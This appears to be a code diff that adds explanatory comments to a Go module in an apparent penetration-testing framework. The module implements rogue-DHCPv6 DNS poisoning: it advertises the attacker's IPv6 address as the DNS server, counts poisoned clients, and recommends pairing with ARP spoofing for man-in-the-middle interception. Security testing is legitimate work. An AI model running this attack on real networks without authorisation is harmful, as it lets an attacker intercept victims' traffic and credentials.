@@ -10,6 +10,7 @@ import (
 	"github.com/qyvora/toha3ee/internal/safety"
 )
 
+// init registers the DHCPv6 spoofing module in the global attack registry.
 func init() {
 	attacks.Register(&DHCP6Spoof{})
 }
@@ -17,13 +18,15 @@ func init() {
 // DHCP6Spoof advertises a rogue DNS server to IPv6 clients.
 type DHCP6Spoof struct{}
 
-// Meta implements attacks.Module.
+// Meta implements attacks.Module, returning the module's registry descriptor.
 func (*DHCP6Spoof) Meta() attacks.ModuleMeta {
 	return attacks.ModuleMeta{
-		ID:          "dhcp6.spoof",
-		Category:    "mitm",
-		Risk:        attacks.RiskMedium,
-		Targets:     []string{"host"},
+		ID:       "dhcp6.spoof",
+		Category: "mitm",
+		Risk:     attacks.RiskMedium,
+		Targets:  []string{"host"},
+		// An IPv6 address is required: it is the address we advertise as the
+		// DNS server and the source we must route victims' queries to.
 		Requires:    []string{"cap.ipv6"},
 		Description: "rogue DHCPv6 server advertising this host's IPv6 as the DNS server",
 		Limitations: "only affects networks with IPv6 and clients that accept DHCPv6-provided DNS; requires an attacker IPv6 address",
@@ -38,11 +41,15 @@ func (*DHCP6Spoof) Preflight(ctx *attacks.AttackCtx) (*attacks.PreflightReport, 
 		return rep, nil
 	}
 	rep.AddOK("iface", ctx.Iface.String())
+	// DHCPv6's DNS option (option 23) must carry an attacker-routable address;
+	// without an IPv6 address on the interface there is nothing to advertise.
 	if ctx.Iface.IPv6 == nil {
 		rep.AddBlocked("ipv6", "interface has no IPv6 address; DHCPv6 DNS poisoning impossible")
 	} else {
 		rep.AddOK("ipv6", ctx.Iface.IPv6.String())
 	}
+	// Advertising a DNS server only matters if the victims' DNS traffic is
+	// actually redirected to us, hence the MITM pairing hint.
 	rep.AddFixable("mitm", "run arp.spoof (or IPv6 equivalents) so clients resolve names through this host")
 	return rep, nil
 }
@@ -52,6 +59,8 @@ func (*DHCP6Spoof) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
 	if ctx.Iface.IPv6 == nil {
 		return fmt.Errorf("dhcp6.spoof: no IPv6 address on %s", ctx.Iface.Name)
 	}
+	// Re-fetch the net.Interface because the responder needs the interface
+	// index to compute link-local scoped addresses for raw IPv6 delivery.
 	iface, err := net.InterfaceByName(ctx.Iface.Name)
 	if err != nil {
 		return fmt.Errorf("dhcp6.spoof: %w", err)
@@ -88,6 +97,8 @@ func (*DHCP6Spoof) Verify(ctx *attacks.AttackCtx) (*attacks.Impact, error) {
 	}
 	r := v.(*dhcp6.Responder)
 	imp := &attacks.Impact{
+		// Poisoned counts clients that accepted our DNS answer and will now
+		// resolve through us; Queries is the raw request total.
 		Summary: fmt.Sprintf("answered %d DHCPv6 query(ies)", r.Poisoned.Load()),
 	}
 	imp.Add("poisoned", fmt.Sprintf("%d", r.Poisoned.Load()))
@@ -105,4 +116,5 @@ func (*DHCP6Spoof) Cleanup(ctx *attacks.AttackCtx) error {
 	return nil
 }
 
+// Compile-time assertion that DHCP6Spoof implements attacks.Module.
 var _ attacks.Module = (*DHCP6Spoof)(nil)
